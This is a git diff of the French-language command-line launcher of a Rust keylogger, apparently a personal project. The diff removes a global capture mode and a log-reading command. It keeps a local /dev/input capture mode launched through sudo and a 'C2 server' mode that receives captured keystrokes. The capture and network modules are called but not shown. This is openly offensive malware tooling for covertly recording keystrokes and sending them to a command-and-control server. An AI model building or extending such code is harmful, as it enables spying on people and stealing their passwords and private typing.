@@ -31,12 +31,6 @@ enum Commands {
         #[arg(short, long, default_value = "auto")]
         device: String,
     },
-
-    /// Lecture directe des logs (appelé par le menu)
-    Read {
-        #[arg(short, long, default_value = "logs.enc")]
-        file: String,
-    },
 }
 
 fn main() {
@@ -47,16 +41,14 @@ fn main() {
     println!("{}", " |_|\\_\\___|\\__,_|_|\\___|\\___|_|    ".yellow());
     println!();
 
-     let cli = Cli::parse();
+    let cli = Cli::parse();
 
     match cli.command {
-        Commands::Start { device } => {
+        Commands::Start { device: _ } => {
             let options = vec![
-                "Lancer keylogger (mode device /dev/input/)",
-                "Lancer keylogger (mode global rdev)",
-                "Lire les logs déchiffrés",
+            	"Mode serveur C2",
+                "Mode local test(/dev/input/)",
                 "Supprimer les logs",
-                "Écouter en mode serveur C2 (reçoit les frappes)",
                 "Quitter",
             ];
 
@@ -64,7 +56,7 @@ fn main() {
 
             match ans {
                 Ok(choice) => match choice {
-                    "Lancer keylogger (mode device /dev/input/)" => {
+                    "Mode local test(/dev/input/)" => {
                         let current_path = std::env::current_dir().unwrap();
                         let binary_path = current_path.join("target/release/keylogger-rust");
 
@@ -81,31 +73,6 @@ fn main() {
                             .expect("❌ Erreur lancement keylogger device");
                     }
 
-                    "Lancer keylogger (mode global rdev)" => {
-                        let current_path = std::env::current_dir().unwrap();
-                        let binary_path = current_path.join("target/release/keylogger-rust");
-
-                        Command::new("xterm")
-                            .arg("-hold")
-                            .arg("-e")
-                            .arg("bash")
-                            .arg("-c")
-                            .arg(format!(
-                                "sudo {} run --device=rdev",
-                                binary_path.to_string_lossy()
-                            ))
-                            .spawn()
-                            .expect("❌ Erreur lancement keylogger rdev");
-                    }
-
-                    "Lire les logs déchiffrés" => {
-                        Command::new("xterm")
-                            .arg("-e")
-                            .arg("bash -c './target/release/keylogger-rust read; echo \"Appuie sur une touche pour fermer...\"; read'")
-                            .spawn()
-                            .expect("❌ Erreur lecture logs");
-                    }
-
                     "Supprimer les logs" => {
                         let path = env::current_dir().unwrap().join("logs.enc");
 
@@ -117,7 +84,7 @@ fn main() {
                         }
                     }
 
-                    "Écouter en mode serveur C2 (reçoit les frappes)" => {
+                    "Mode serveur C2" => {
                         let current_path = std::env::current_dir().unwrap();
                         let binary_path = current_path.join("target/release/keylogger-rust");
 
@@ -153,7 +120,7 @@ fn main() {
 
             println!("{}", format!("[*] Keylogger démarré sur {}", actual_device).green());
 
-            // Si c2server, ne demande pas de passphrase
+            // ✅ Mode C2 server pour recevoir les frappes
             if actual_device == "c2server" {
                 modules::network::start_server();
                 return;
@@ -168,25 +135,7 @@ fn main() {
 
             let _key = get_or_create_key(passphrase);
 
-            if actual_device == "rdev" {
-                modules::logger::start_rdev_logger();
-            } else {
-                modules::logger::start_keylogger(&actual_device, passphrase);
-            }
-        }
-
-        Commands::Read { file } => {
-            println!("{}", format!("[*] Lecture du fichier {}", file).cyan());
-
-            print!(" Entrez votre passphrase : ");
-            io::stdout().flush().unwrap();
-
-            let mut passphrase = String::new();
-            io::stdin().read_line(&mut passphrase).unwrap();
-            let passphrase = passphrase.trim();
-
-            let path = env::current_dir().unwrap().join(&file);
-            modules::decrypt::read_plaintext_logs();
+            modules::logger::start_keylogger(&actual_device, passphrase);
         }
     }
 }
